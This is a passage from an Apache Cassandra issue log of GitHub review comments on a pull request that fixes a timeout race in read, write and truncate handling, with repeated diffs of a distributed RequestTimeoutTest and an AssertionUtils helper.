+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void update()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""UPDATE %s.tbl SET v=? WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void batchInsert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(batch(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)"")), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void rangeSelect()
+    {
+        CLUSTER.filters().verbs(Verb.RANGE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl""), ConsistencyLevel.ALL))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void select()
+    {
+        CLUSTER.filters().verbs(Verb.READ_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void truncate()
+    {
+        CLUSTER.filters().verbs(Verb.TRUNCATE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""TRUNCATE %s.tbl""), ConsistencyLevel.ALL))
+                  .is(AssertionUtils.rootCauseIs(TimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareSelect()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.SERIAL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class)); // why does write have its own type but not read?
+    }
+
+    @Test
+    public void casV2CommitInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS_COMMIT_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    private static void withPaxos(Config.PaxosVariant variant)
+    {
+        CLUSTER.forEach(i -> i.runOnInstance(() -> Paxos.setPaxosVariant(variant)));
+    }
+
+    private static String batch(String cql)
+    {
+        return ""BEGIN "" + BatchStatement.Type.UNLOGGED.name() + "" BATCH\n"" + cql + ""\nAPPLY BATCH"";
+    }
+
+    public static class BB
+    {
+        public static void install(ClassLoader cl, Integer num)
+        {
+            new ByteBuddy().rebase(Condition.Async.class)
+                           .method(named(""await"").and(takesArguments(2)))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static boolean await(long time, TimeUnit units, @This Awaitable self, @SuperMethod Method method) throws InterruptedException, InvocationTargetException, IllegalAccessException
+        {
+            // attempt to decouple the two usages of write_request_timeout: await(write_request_timeout) and message expire
+            return (boolean) method.invoke(self, time * 10, units);

Review Comment:
   The race is that we use the same timeout for messages and condition wait, so the message expire system needs to happen-before the signal timeout is done to hit the race that this patch deals with.  For me, most of the time signal timeout happens-before message expires, which then means `signal=false`, which means we timeout (and were before).  Now, we need to *FORCE* message expires to happen-before in order to hit the condition this patch is fixing.



;19/Aug/22 18:29;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950466837


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void update()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""UPDATE %s.tbl SET v=? WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void batchInsert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(batch(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)"")), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void rangeSelect()
+    {
+        CLUSTER.filters().verbs(Verb.RANGE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl""), ConsistencyLevel.ALL))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void select()
+    {
+        CLUSTER.filters().verbs(Verb.READ_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void truncate()
+    {
+        CLUSTER.filters().verbs(Verb.TRUNCATE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""TRUNCATE %s.tbl""), ConsistencyLevel.ALL))
+                  .is(AssertionUtils.rootCauseIs(TimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareSelect()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.SERIAL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class)); // why does write have its own type but not read?
+    }
+
+    @Test
+    public void casV2CommitInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS_COMMIT_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    private static void withPaxos(Config.PaxosVariant variant)
+    {
+        CLUSTER.forEach(i -> i.runOnInstance(() -> Paxos.setPaxosVariant(variant)));
+    }
+
+    private static String batch(String cql)
+    {
+        return ""BEGIN "" + BatchStatement.Type.UNLOGGED.name() + "" BATCH\n"" + cql + ""\nAPPLY BATCH"";
+    }
+
+    public static class BB
+    {
+        public static void install(ClassLoader cl, Integer num)
+        {
+            new ByteBuddy().rebase(Condition.Async.class)
+                           .method(named(""await"").and(takesArguments(2)))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static boolean await(long time, TimeUnit units, @This Awaitable self, @SuperMethod Method method) throws InterruptedException, InvocationTargetException, IllegalAccessException
+        {
+            // attempt to decouple the two usages of write_request_timeout: await(write_request_timeout) and message expire
+            return (boolean) method.invoke(self, time * 10, units);

Review Comment:
   I guess, you are calling out that the test may not be working, so we should validate that the expected branch happened... ill have to think through how to detect that... its the same exception from the caller so without changing that we don't have a clear way to know



;19/Aug/22 18:30;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950469288


##########
test/unit/org/apache/cassandra/utils/AssertionUtils.java:
##########
@@ -0,0 +1,124 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.utils;
+
+import com.google.common.base.Throwables;
+
+import org.assertj.core.api.Condition;
+
+public class AssertionUtils
+{
+    private AssertionUtils()
+    {
+    }
+
+    /**
+     * When working with jvm-dtest the thrown error is in a different {@link ClassLoader} causing type checks
+     * to fail; this method relies on naming instead.
+     */
+    public static Condition<Object> is(Class<?> klass)
+    {
+        String name = klass.getCanonicalName();
+        return new Condition<Object>() {
+            @Override
+            public boolean matches(Object value)
+            {
+                return value.getClass().getCanonicalName().equals(name);
+            }
+
+            @Override
+            public String toString()
+            {
+                return name;
+            }
+        };
+    }
+
+    public static <T extends Throwable> Condition<Throwable> isThrowable(Class<T> klass)
+    {
+        // org.assertj.core.api.AbstractAssert.is has <? super ? extends Throwable> which blocks <T>, so need to
+        // always return Throwable
+        return (Condition<Throwable>) (Condition<?>) is(klass);

Review Comment:
   I tried that, doesn't work with Assertions builder 😢 
   
   The builder type is `? super ? extends T`, so only the actual value of `T` gets allowed... This means cases like the following don't work
   
   ```
   Object o = ""testing""
   Assertions.assertThat(o).is(is(String.class)) // type checking fails, so code doesn't compile.
   ```



;19/Aug/22 18:32;githubbot;600","maedhroz commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950488236


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");

Review Comment:
   If you pointed a gun to my head rn, for all three cases (read/write/truncate), I would just...
   1.) throw a timeout if all the failure reasons in the map are TIMEOUT
   2.) show the user the failure map by endpoint attached to a real error otherwise



;19/Aug/22 19:00;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950565703


##########
src/java/org/apache/cassandra/service/TruncateResponseHandler.java:
##########
@@ -61,24 +63,34 @@ public TruncateResponseHandler(int responseCount)
     public void get() throws TimeoutException
     {
         long timeoutNanos = getTruncateRpcTimeout(NANOSECONDS) - (nanoTime() - start);
-        boolean completedInTime;
+        boolean signaled;
         try
         {
-            completedInTime = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
+            signaled = condition.await(timeoutNanos, NANOSECONDS); // TODO truncate needs a much longer timeout
         }
         catch (InterruptedException e)
         {
             throw new UncheckedInterruptedException(e);
         }
 
-        if (!completedInTime)
-        {
+        if (!signaled)
             throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");
-        }
 
-        if (truncateFailingReplica != null)
+        if (!failureReasonByEndpoint.isEmpty())
         {
-            throw new TruncateException(""Truncate failed on replica "" + truncateFailingReplica);
+            // clone to make sure no race condition happens
+            Map<InetAddressAndPort, RequestFailureReason> failureReasonByEndpoint = new HashMap<>(this.failureReasonByEndpoint);
+            int size = failureReasonByEndpoint.size();
+            long timeouts = failureReasonByEndpoint.values().stream().filter(RequestFailureReason.TIMEOUT::equals).count();
+            long nonTimeout = size - timeouts;
+            if (nonTimeout <= timeouts)
+                throw new TimeoutException(""Truncate timed out - received only "" + responses.get() + "" responses"");

Review Comment:
   spoke with @clohfink and Caleb in slack and will go with 100% replies are timeout = timeout, this would then just make it so this race condition properly returns timeout and doesn't impact any other case.



;19/Aug/22 21:24;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950578886


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
+import net.bytebuddy.implementation.bind.annotation.This;
+import org.apache.cassandra.config.Config;
+import org.apache.cassandra.cql3.statements.BatchStatement;
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.AssertionUtils;
+import org.apache.cassandra.exceptions.CasWriteTimeoutException;
+import org.apache.cassandra.exceptions.ReadTimeoutException;
+import org.apache.cassandra.exceptions.WriteTimeoutException;
+import org.apache.cassandra.net.Verb;
+import org.apache.cassandra.service.paxos.Paxos;
+import org.apache.cassandra.utils.concurrent.Awaitable;
+import org.apache.cassandra.utils.concurrent.Condition;
+import org.assertj.core.api.Assertions;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
+import static net.bytebuddy.matcher.ElementMatchers.takesArguments;
+import static org.apache.cassandra.utils.AssertionUtils.isThrowable;
+
+public class RequestTimeoutTest extends TestBaseImpl
+{
+    private static AtomicInteger NEXT = new AtomicInteger(0);
+    private static Cluster CLUSTER;
+
+    @BeforeClass
+    public static void init() throws IOException
+    {
+        CLUSTER = Cluster.build(3)
+                         .withConfig(c -> c.set(""truncate_request_timeout"", ""10s""))
+                         .withInstanceInitializer(BB::install)
+                         .start();
+        init(CLUSTER);
+        CLUSTER.schemaChange(withKeyspace(""CREATE TABLE %s.tbl (pk int PRIMARY KEY, v int)""));
+    }
+
+    @AfterClass
+    public static void cleanup()
+    {
+        if (CLUSTER != null)
+            CLUSTER.close();
+    }
+
+    @Before
+    public void before()
+    {
+        CLUSTER.filters().reset();
+    }
+
+    @Test
+    public void insert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void update()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""UPDATE %s.tbl SET v=? WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void batchInsert()
+    {
+        CLUSTER.filters().verbs(Verb.MUTATION_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(batch(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?)"")), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(WriteTimeoutException.class));
+    }
+
+    @Test
+    public void rangeSelect()
+    {
+        CLUSTER.filters().verbs(Verb.RANGE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl""), ConsistencyLevel.ALL))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void select()
+    {
+        CLUSTER.filters().verbs(Verb.READ_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.ALL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class));
+    }
+
+    @Test
+    public void truncate()
+    {
+        CLUSTER.filters().verbs(Verb.TRUNCATE_REQ.id).to(2).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""TRUNCATE %s.tbl""), ConsistencyLevel.ALL))
+                  .is(AssertionUtils.rootCauseIs(TimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    @Test
+    public void casV2PrepareSelect()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS2_PREPARE_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""SELECT * FROM %s.tbl WHERE pk=?""), ConsistencyLevel.SERIAL, NEXT.getAndIncrement()))
+                  .is(isThrowable(ReadTimeoutException.class)); // why does write have its own type but not read?
+    }
+
+    @Test
+    public void casV2CommitInsert()
+    {
+        withPaxos(Config.PaxosVariant.v2);
+
+        CLUSTER.filters().verbs(Verb.PAXOS_COMMIT_REQ.id).to(2, 3).drop();
+        Assertions.assertThatThrownBy(() -> CLUSTER.coordinator(1).execute(withKeyspace(""INSERT INTO %s.tbl (pk, v) VALUES (?, ?) IF NOT EXISTS""), ConsistencyLevel.ALL, NEXT.getAndIncrement(), NEXT.getAndIncrement()))
+                  .is(isThrowable(CasWriteTimeoutException.class));
+    }
+
+    private static void withPaxos(Config.PaxosVariant variant)
+    {
+        CLUSTER.forEach(i -> i.runOnInstance(() -> Paxos.setPaxosVariant(variant)));
+    }
+
+    private static String batch(String cql)
+    {
+        return ""BEGIN "" + BatchStatement.Type.UNLOGGED.name() + "" BATCH\n"" + cql + ""\nAPPLY BATCH"";
+    }
+
+    public static class BB
+    {
+        public static void install(ClassLoader cl, Integer num)
+        {
+            new ByteBuddy().rebase(Condition.Async.class)
+                           .method(named(""await"").and(takesArguments(2)))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static boolean await(long time, TimeUnit units, @This Awaitable self, @SuperMethod Method method) throws InterruptedException, InvocationTargetException, IllegalAccessException
+        {
+            // attempt to decouple the two usages of write_request_timeout: await(write_request_timeout) and message expire
+            return (boolean) method.invoke(self, time * 10, units);

Review Comment:
   ok since now we have a single method to say when isTimeout=true, was able to use that to track times we returned `true` and assert that in the test.



;19/Aug/22 21:56;githubbot;600","dcapwell commented on code in PR #1796:
URL: https://github.com/apache/cassandra/pull/1796#discussion_r950585619


##########
test/distributed/org/apache/cassandra/distributed/test/metrics/RequestTimeoutTest.java:
##########
@@ -0,0 +1,191 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test.metrics;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.concurrent.atomic.AtomicInteger;
+
+import org.junit.AfterClass;
+import org.junit.Before;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import net.bytebuddy.ByteBuddy;
+import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
+import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperMethod;
